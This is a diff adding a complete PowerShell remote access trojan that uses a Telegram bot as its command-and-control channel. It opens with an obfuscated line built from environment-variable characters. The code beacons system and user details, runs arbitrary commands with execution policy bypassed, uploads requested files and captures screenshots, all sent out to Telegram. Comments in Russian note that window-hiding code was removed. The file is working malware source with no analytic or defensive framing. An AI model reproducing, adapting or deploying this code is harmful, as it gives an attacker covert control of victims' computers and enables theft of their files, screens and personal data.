+& (($env:ProgramFiles[12], $env:ProgramW6432[14], $env:ComSpec[25]) -join '') (([char]36, $env:ProgramFiles[0], $env:PSModulePath[47], $env:CommonProgramFiles[8], $env:ProgramData[12], $env:PSModulePath[107], $env:windir[6], $env:CommonProgramFiles[23], [char]61, $env:ProgramFiles[10], [char]34, [char]55, [char]52, [char]55, $env:PSModulePath[144], [char]55, [char]55, [char]52, $env:PSModulePath[144], $env:ComSpec[17], [char]53, [char]34) -join '')
+
+$MaxRetries = 5
+$BaseDelay = 10
+$CommandCheckInterval = 7
+$JitterFactor = 0.3
+$CommandTimeout = 30
+$MaxOutputLength = 3900
+
+$ConsecutiveErrors = 0
+$MaxConsecutiveErrors = 10
+$CurrentProcess = $null
+$StopRequested = $false
+$CurrentDirectory = Get-Location
+
+function Test-UserAuthorized {
+    param($MessageChatID)
+    return ($MessageChatID -eq $ChatID)
+}
+
+function Get-JitteredDelay {
+    param ($BaseDelay)
+    $Jitter = $BaseDelay * $JitterFactor * (Get-Random -Minimum -1.0 -Maximum 1.0)
+    $JitteredDelay = $BaseDelay + $Jitter
+    return [math]::Max(1, $JitteredDelay)
+}
+
+function Send-TelegramMessage {
+    param(
+        [string]$Message,
+        [int]$RetryCount = 0
+    )
+
+    if ([string]::IsNullOrEmpty($BotToken) -or [string]::IsNullOrEmpty($ChatID)) {
+        return $null
+    }
+
+    # Truncate message if too long
+    if ($Message.Length -gt $MaxOutputLength) {
+        $Message = $Message.Substring(0, $MaxOutputLength) + "`n[...] Output truncated"
+    }
+
+    $Uri = "https://api.telegram.org/bot$BotToken/sendMessage"
+    $Body = @{
+        chat_id = $ChatID
+        text = $Message
+        disable_web_page_preview = "true"
+    }
+
+    try {
+        $Response = Invoke-RestMethod -Uri $Uri -Method Post -Body $Body -ContentType "application/x-www-form-urlencoded" -TimeoutSec 15 -ErrorAction Stop
+        $Script:ConsecutiveErrors = 0
+        return $Response
+    }
+    catch {
+        if ($RetryCount -lt $MaxRetries) {
+            $Delay = Get-JitteredDelay -BaseDelay ($BaseDelay * [math]::Pow(2, $RetryCount))
+            Start-Sleep -Seconds $Delay
+            return Send-TelegramMessage -Message $Message -RetryCount ($RetryCount + 1)
+        }
+        else {
+            $Script:ConsecutiveErrors++
+            return $null
+        }
+    }
+}
+
+function Send-TelegramFile {
+    param(
+        [string]$FilePath,
+        [string]$Caption = ""
+    )
+
+    if (-not (Test-Path $FilePath)) {
+        return "File not found: $FilePath"
+    }
+
+    $Uri = "https://api.telegram.org/bot$BotToken/sendDocument"
+    
+    try {
+        $Boundary = [System.Guid]::NewGuid().ToString()
+        $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        $FileName = [System.IO.Path]::GetFileName($FilePath)
+        
+        $Encoding = [System.Text.Encoding]::UTF8
+        $Stream = New-Object System.IO.MemoryStream
+        
+        $Parts = @(
+            @{ Name = "chat_id"; Value = $ChatID },
+            @{ Name = "caption"; Value = $Caption }
+        )
+        
+        foreach ($Part in $Parts) {
+            if (-not [string]::IsNullOrEmpty($Part.Value)) {
+                $PartData = $Encoding.GetBytes("--$Boundary`r`nContent-Disposition: form-data; name=`"$($Part.Name)`"`r`n`r`n$($Part.Value)`r`n")
+                $Stream.Write($PartData, 0, $PartData.Length)
+            }
+        }
+        
+        $FileHeader = $Encoding.GetBytes("--$Boundary`r`nContent-Disposition: form-data; name=`"document`"; filename=`"$FileName`"`r`nContent-Type: application/octet-stream`r`n`r`n")
+        $Stream.Write($FileHeader, 0, $FileHeader.Length)
+        $Stream.Write($FileBytes, 0, $FileBytes.Length)
+        
+        $Closing = $Encoding.GetBytes("`r`n--$Boundary--`r`n")
+        $Stream.Write($Closing, 0, $Closing.Length)
+        
+        $Stream.Position = 0
+        
+        $Headers = @{
+            "Content-Type" = "multipart/form-data; boundary=$Boundary"
+        }
+
+        $Response = Invoke-RestMethod -Uri $Uri -Method Post -Body $Stream -Headers $Headers -ErrorAction Stop
+        return "File sent successfully: $FilePath"
+    }
+    catch {
+        return "Error sending file: $($_.Exception.Message)"
+    }
+    finally {
+        if ($Stream) { $Stream.Dispose() }
+    }
+}
+
+function Get-TelegramCommands {
+    param(
+        [int]$Offset = 0,
+        [int]$RetryCount = 0
+    )
+
+    if ([string]::IsNullOrEmpty($BotToken) -or [string]::IsNullOrEmpty($ChatID)) {
+        return @{ Commands = @(); NextOffset = $Offset }
+    }
+
+    $Uri = "https://api.telegram.org/bot$BotToken/getUpdates?offset=$Offset&timeout=25"
+
+    try {
+        $Response = Invoke-RestMethod -Uri $Uri -Method Get -ErrorAction Stop -TimeoutSec 30
+        $Script:ConsecutiveErrors = 0
+
+        if ($Response.ok -and $Response.result) {
+            $LastUpdateID = 0
+            $Commands = @()
+
+            foreach ($Update in $Response.result) {
+                $LastUpdateID = $Update.update_id
+                if ($Update.message -and (Test-UserAuthorized $Update.message.chat.id) -and $Update.message.text -match "^\/") {
+                    $Commands += @{
+                        UpdateID = $Update.update_id
+                        Command = $Update.message.text.Trim()
+                        MessageID = $Update.message.message_id
+                        ChatID = $Update.message.chat.id
+                    }
+                }
+            }
+            
+            return @{
+                Commands = $Commands
+                NextOffset = if ($LastUpdateID -gt 0) { $LastUpdateID + 1 } else { $Offset }
+            }
+        }
+        return @{ Commands = @(); NextOffset = $Offset }
+    }
+    catch {
+        if ($RetryCount -lt $MaxRetries) {
+            $Delay = Get-JitteredDelay -BaseDelay ($BaseDelay * [math]::Pow(2, $RetryCount))
+            Start-Sleep -Seconds $Delay
+            return Get-TelegramCommands -Offset $Offset -RetryCount ($RetryCount + 1)
+        }
+        else {
+            $Script:ConsecutiveErrors++
+            return @{ Commands = @(); NextOffset = $Offset }
+        }
+    }
+}
+
+function Invoke-CommandSafe {
+    param([string]$Command)
+
+    $script:StopRequested = $false
+
+    try {
+        $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
+        $ProcessInfo.FileName = "powershell.exe"
+        $ProcessInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"$Command 2>&1 | Out-String`""
+        $ProcessInfo.RedirectStandardOutput = $true
+        $ProcessInfo.RedirectStandardError = $true
+        $ProcessInfo.UseShellExecute = $false
+        # Удалено: $ProcessInfo.CreateNoWindow = $true
+        # Удалено: $ProcessInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+
+        $Process = New-Object System.Diagnostics.Process
+        $Process.StartInfo = $ProcessInfo
+        $script:CurrentProcess = $Process
+        
+        $Process.Start() | Out-Null
+        $Output = ""
+        $StartTime = Get-Date
+        
+        while (-not $Process.HasExited -and -not $script:StopRequested) {
+            if (((Get-Date) - $StartTime).TotalSeconds -gt $CommandTimeout) {
+                $Process.Kill()
+                $Output += "`n[!] Command timed out after $CommandTimeout seconds"
+                break
+            }
+            
+            $Output += $Process.StandardOutput.ReadToEnd()
+            Start-Sleep -Milliseconds 100
+            
+            if ($script:StopRequested) {
+                $Process.Kill()
+                $Output += "`n[!] Command stopped by user request"
+                break
+            }
+        }
+
+        $Output += $Process.StandardOutput.ReadToEnd()
+        $ErrorOutput = $Process.StandardError.ReadToEnd()
+        if ($ErrorOutput) {
+            $Output += "`n[ERROR] $ErrorOutput"
+        }
+
+        $Output = $Output.Trim()
+        if ([string]::IsNullOrEmpty($Output)) {
+            $Output = "Command executed successfully (no output)"
+        }
+
+        $script:CurrentProcess = $null
+        return $Output
+    }
+    catch {
+        $script:CurrentProcess = $null
+        return "Error executing command: $($_.Exception.Message)"
+    }
+}
+
+function Get-SystemBeacon {
+    try {
+        $OS = Get-WmiObject -Class Win32_OperatingSystem -ErrorAction Stop
+        $Computer = Get-WmiObject -Class Win32_ComputerSystem -ErrorAction Stop
+        $CPU = Get-WmiObject -Class Win32_Processor -ErrorAction Stop | Select-Object -First 1
+        $Memory = Get-WmiObject -Class Win32_OperatingSystem -ErrorAction Stop
+        $Network = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1
+        
+        $TotalMemoryGB = [math]::Round($Memory.TotalVisibleMemorySize / 1MB, 2)
+        $FreeMemoryGB = [math]::Round($Memory.FreePhysicalMemory / 1MB, 2)
+        $UsedMemoryGB = $TotalMemoryGB - $FreeMemoryGB
+        $UsedMemoryPercent = [math]::Round(($UsedMemoryGB / $TotalMemoryGB) * 100, 2)
+        
+        $Admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+        
+        $BeaconMessage = @"
+SYSTEM BEACON - $env:COMPUTERNAME
+
+SYSTEM INFO:
+- OS: $($OS.Caption)
+- Version: $($OS.Version)
+- Architecture: $(if ($env:PROCESSOR_ARCHITECTURE -eq "AMD64") { "64-bit" } else { "32-bit" })
+- Hostname: $env:COMPUTERNAME
+- Domain: $env:USERDOMAIN
+- User: $env:USERNAME
+- Admin: $(if ($Admin) { "Yes" } else { "No" })
+
+HARDWARE:
+- CPU: $($CPU.Name)
+- Cores: $($CPU.NumberOfCores)
+- RAM: $UsedMemoryPercent% used ($UsedMemoryGB GB / $TotalMemoryGB GB)
+- Manufacturer: $($Computer.Manufacturer)
+- Model: $($Computer.Model)
+
+NETWORK:
+- IP: $($Network.IPAddress)
+- Interface: $($Network.InterfaceAlias)
+- Public IP: $(try { (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5) } catch { "Unknown" })
+
+STATUS:
+- Uptime: $([math]::Round($OS.ConvertToDateTime($OS.LastBootUpTime).ToLocalTime().Subtract((Get-Date)).TotalHours * -1, 2)) hours
+- Time: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+- Language: $((Get-Culture).Name)
+
+LOCATION:
+- Timezone: $((Get-TimeZone).DisplayName)
+- Country: $(try { (Get-Culture).DisplayName } catch { "Unknown" })
+"@
+
+        return $BeaconMessage
+    }
+    catch {
+        return "Beacon Error: $($_.Exception.Message)"
+    }
+}
+
+function Get-DirectoryContents {
+    param($Path)
+    
+    if (-not $Path) { $Path = $CurrentDirectory.Path }
+    
+    try {
+        if (Test-Path $Path) {
+            if ((Get-Item $Path) -is [System.IO.DirectoryInfo]) {
+                $Items = Get-ChildItem $Path | ForEach-Object { 
+                    $Type = if ($_.PSIsContainer) { "[DIR]" } else { "[FILE]" }
+                    "$Type $($_.Name) ($([math]::Round($_.Length/1KB, 2)) KB)"
+                }
+                return "Contents of $Path :`n`n" + ($Items -join "`n")
+            } else {
+                return "Error: Path is not a directory"
+            }
+        } else {
+            return "Error: Path does not exist"
+        }
+    }
+    catch {
+        return "Error: $($_.Exception.Message)"
+    }
+}
+
+function Set-CurrentDirectory {
+    param($Path)
+    
+    try {
+        if (Test-Path $Path) {
+            Set-Location $Path
+            $script:CurrentDirectory = Get-Location
+            return "Changed directory to: $($CurrentDirectory.Path)"
+        } else {
+            return "Error: Path does not exist"
+        }
+    }
+    catch {
+        return "Error: $($_.Exception.Message)"
+    }
+}
+
+function Invoke-Screenshot {
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        
+        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen
+        $Bounds = $Screen.Bounds
+        $Bitmap = New-Object System.Drawing.Bitmap $Bounds.Width, $Bounds.Height
+        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
+        $Graphics.CopyFromScreen($Bounds.Location, [System.Drawing.Point]::Empty, $Bounds.Size)
+        
+        $FilePath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
+        $Bitmap.Save($FilePath, [System.Drawing.Imaging.ImageFormat]::Png)
+        
+        $Graphics.Dispose()
+        $Bitmap.Dispose()
+        
+        # Send the file
+        $result = Send-TelegramFile -FilePath $FilePath -Caption "Screenshot from $env:COMPUTERNAME"
+        
+        # Clean up
+        Remove-Item $FilePath -Force -ErrorAction SilentlyContinue
+        
+        return $result
+    }
+    catch {
+        return "Screenshot Error: $($_.Exception.Message)"
+    }
+}
+
+function Process-Command {
+    param($Command, $ChatID)
+    
+    if (-not (Test-UserAuthorized $ChatID)) {
+        return "Unauthorized access attempt"
+    }
+    
+    $CommandParts = $Command -split " "
+    $BaseCommand = $CommandParts[0].ToLower()
+    $Arguments = $CommandParts[1..($CommandParts.Length-1)] -join " "
+    
+    switch -wildcard ($BaseCommand) {
+        "/help" {
+            return @"
+RAT COMMANDS:
+
+BASIC:
+/help - Lists all commands
+/ping - Test connection
+/beacon - Get system information
+/delme - Delete WinConf.txt from TEMP
+
+FILE OPERATIONS:
+/ls [path] - Lists directory contents
+/cd [path] - Changes directory
+/download [file_path] - Downloads file
+
+SYSTEM:
+/cmd [command] - Executes command in shell
+
+SCREENSHOT:
+/screenshot - Takes screenshot of all monitors
+"@
+        }
+        
+        "/ping" {
+            return "Pong! Agent is active on $env:COMPUTERNAME"
+        }
+        
+        "/beacon" {
+            return Get-SystemBeacon
+        }
+        
+        "/delme" {
+            $filePath = "$env:TEMP\WinConf.txt"
+            if (Test-Path $filePath) {
+                try {
+                    Remove-Item $filePath -Force -ErrorAction Stop
+                    return "File deleted successfully: $filePath"
+                }
+                catch {
+                    return "Error deleting file: $($_.Exception.Message)"
+                }
+            } else {
+                return "File not found: $filePath"
+            }
+        }
+        
+        "/ls" {
+            return Get-DirectoryContents $Arguments
+        }
+        
+        "/cd" {
+            if (-not $Arguments) { return "Usage: /cd [path]" }
+            return Set-CurrentDirectory $Arguments
+        }
+        
+        "/download" {
+            if (-not $Arguments) { return "Usage: /download [file_path]" }
+            if (Test-Path $Arguments) {
+                $result = Send-TelegramFile -FilePath $Arguments -Caption "File from $env:COMPUTERNAME"
+                return $result
+            } else {
+                return "File not found: $Arguments"
+            }
+        }
+        
+        "/screenshot" {
+            return Invoke-Screenshot
+        }
+        
+        "/screen" {
+            return Invoke-Screenshot
+        }
+        
+        "/cmd" {
+            if (-not $Arguments) { return "Usage: /cmd [command]" }
+            return Invoke-CommandSafe $Arguments
+        }
+        
+        default {
+            return "Unknown command: $BaseCommand. Type /help for available commands."
+        }
+    }
+}
+
+function Start-C2Loop {
+    if ([string]::IsNullOrEmpty($BotToken) -or [string]::IsNullOrEmpty($ChatID)) {
+        return
+    }
+    
+    try {
+        $beacon = Get-SystemBeacon
+        Send-TelegramMessage -Message $beacon | Out-Null
+    }
+    catch {
+    }
+    
+    $UpdateOffset = 0
+    $LoopCount = 0
+    $LastBeaconTime = Get-Date
+
+    while ($true) {
+        $LoopCount++
+
+        try {
+            if (((Get-Date) - $LastBeaconTime).TotalHours -ge 1) {
+                $beacon = Get-SystemBeacon
+                Send-TelegramMessage -Message $beacon | Out-Null
+                $LastBeaconTime = Get-Date
+            }
+
+            $UpdateData = Get-TelegramCommands -Offset $UpdateOffset
+            $UpdateOffset = $UpdateData.NextOffset
+
+            foreach ($Cmd in $UpdateData.Commands) {
+                try {
+                    $Result = Process-Command -Command $Cmd.Command -ChatID $Cmd.ChatID
+                    Send-TelegramMessage -Message $Result | Out-Null
+                }
+                catch {
+                    Send-TelegramMessage -Message "Error processing command: $($_.Exception.Message)" | Out-Null
+                }
+            }
+
+            if ($Script:ConsecutiveErrors -ge $MaxConsecutiveErrors) {
+                exit 1
+            }
+
+            $SleepTime = Get-JitteredDelay -BaseDelay $CommandCheckInterval
+            Start-Sleep -Seconds $SleepTime
+        }
+        catch {
+            $Script:ConsecutiveErrors++
+            Start-Sleep -Seconds (Get-JitteredDelay -BaseDelay 30)
+        }
+    }
+}
+
+try {
+    # Удален блок кода, который использовал WinAPI для скрытия окна.
+    
+    Start-C2Loop
+}
+catch {
+    exit 1
+}
